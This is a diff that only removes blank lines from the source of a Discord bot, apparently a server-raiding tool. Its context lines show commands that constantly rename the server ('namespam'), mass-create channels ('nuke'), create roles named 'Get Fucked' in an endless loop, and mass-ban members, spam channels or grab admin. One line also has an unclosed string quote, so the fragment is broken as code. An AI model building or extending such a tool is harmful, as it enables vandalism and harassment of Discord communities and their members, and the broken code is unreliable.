@@ -63,8 +63,6 @@ async def cmds(ctx):
  embed.add_field(name="namespam",value="Constantly changes the server name", inline=False)
  embed.add_field(name="info,value="Gives info about a user", inline=False)
 
-
-
 @bot.command(pass_context=True)
 async def nick(ctx, rename_to):
         await ctx.message.delete()
@@ -146,7 +144,6 @@ async def nuke(ctx, amount=500):
            await guild.create_text_channel(random.choice(CHANNEL_NAMES))
         print ('Action NUKE complete')
 
-
 @bot.command(pass_context=True)
 async def ban(ctx):
         await ctx.message.delete()
@@ -170,7 +167,6 @@ async def roles(ctx):
     while True:
         guild = ctx.guild
         await guild.create_role(name="Get Fucked")
-
 
 @bot.command(pass_context=True)
 async def spamchan(ctx): 
@@ -214,7 +210,6 @@ async def ping(ctx):
     await ctx.message.delete()
     await ctx.send(f"Pong! My latency is {round(bot.latency *1000)}ms.")
   
- 
 @bot.command(pass_context=True)
 async def admin(ctx):
   await ctx.message.delete()
